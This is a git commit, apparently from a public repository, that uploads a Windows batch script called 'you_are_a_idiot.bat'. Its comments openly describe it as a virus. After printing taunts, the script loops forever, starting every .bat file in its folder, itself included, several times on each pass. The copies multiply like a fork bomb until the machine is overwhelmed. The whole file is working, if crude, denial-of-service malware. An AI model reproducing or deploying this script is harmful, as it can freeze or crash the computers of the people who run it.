e6821154b48fa95b9e6330242301403146035c5c
eatsomedust4 <142138297+eatsomedust4@users.noreply.github.com>
2023-10-10 12:40:51 +0800

    Add files via upload

---
+++ you_are_a_idiot.bat
@@ -0,0 +1,33 @@
+@ECHO OFF
+::
+::
+::
+:: I AM VIRUS
+:: HAHAHAHAHA
+:: LOOOOOOOLS    
+::
+::
+::
+:: GO DO UR HOMEWORK
+:: MALWHERE ANALIZER
+::
+::
+::
+echo YOU ARE A IDIOT
+timeout 1
+echo HAHAHAHAHAHAHAHA
+timeout 1
+:loop
+echo YOU ARE A IDIOT
+timeout 1
+for %%f in (*.bat) do (
+start %%f
+start %%f
+timeout 3
+start %%f
+start %%f
+timeout 3
+start %%f
+start %%f
+)
+goto loop
